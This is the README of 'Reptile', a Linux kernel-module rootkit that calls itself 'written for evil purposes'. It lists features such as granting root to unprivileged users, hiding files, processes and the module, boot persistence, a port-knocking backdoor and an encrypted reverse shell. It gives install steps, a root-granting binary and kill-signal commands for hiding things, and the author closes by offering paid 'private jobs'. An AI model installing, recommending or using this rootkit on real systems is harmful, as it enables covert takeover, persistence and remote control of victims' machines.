# Reptile

<img align="left" src="https://imgur.com/nqujOlz.png">

<br><br><br><br><br>Reptile is a LKM rootkit written for evil purposes that runs on Linux kernel 2.6.x/3.x/4.x. 
<br><br><br><br><br>

## Features

- Give root to unprivileged users
- Hide files and directories
- Hide files contents
- Hide processes
- Hide himself
- Hidden boot persistence
- Strings obfuscation (Method suggested by: [milabs](https://github.com/milabs))
- ICMP/UDP/TCP port-knocking backdoor
- Full TTY/PTY shell with file transfer
- Client to handle Reptile Shell
- Shell connect back each X times (not default)
   
## Install
```
apt-get install linux-headers-$(uname -r)
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
./setup.sh install
```
## Uninstall
```
./setup.sh remove
```

## Usage

Binaries will be copied to `/reptile` folder (or any name you chose), that will be hidden by Reptile.

### Getting root privileges

Just run: `/reptile/reptile_r00t`

### Hiding

- Hide/unhide reptile module: `kill -50 0`
- Hide/unhide process: `kill -49 <PID>`
- Hide/unhide files contents: `kill -51 0` and all content between the tags will be hidden

Example:
```
#<reptile> 
content to hide 
#</reptile>
```

### Backdoor

Configure and compile client: `./setup.sh client`
<br>
You use the client to send magic packets and get your full TTY encrypted shell!

<p align="center">
   <img src="https://imgur.com/1v3i1Rn.png">
</p>

More informations: [Reptile Shell](sbin/README.md)

## Warning

Some functions of this module is based on another rootkits. Please see the references!

## References

- “[LKM HACKING](http://www.ouah.org/LKM_HACKING.html)”, The Hackers Choice (THC), 1999;
- https://github.com/mncoppola/suterusu
- https://github.com/m0nad/Diamorphine.git
- https://github.com/David-Reguera-Garcia-Dreg/enyelkm.git
- https://github.com/maK-/maK_it-Linux-Rootkit
- “[Abuse of the Linux Kernel for Fun and Profit](http://phrack.org/issues/50/5.html)”, Halflife, Phrack 50, 1997;
- https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/
- https://github.com/creaktive/tsh
- http://www.drkns.net/kernel-who-does-magic/

## Disclaimer

I do private jobs, if you are interesting send me an e-mail at: f0rb1dd3n@tuta.io

<br>
<p align="center">
   <img src="https://imgur.com/RdYgb1T.gif">
</p>
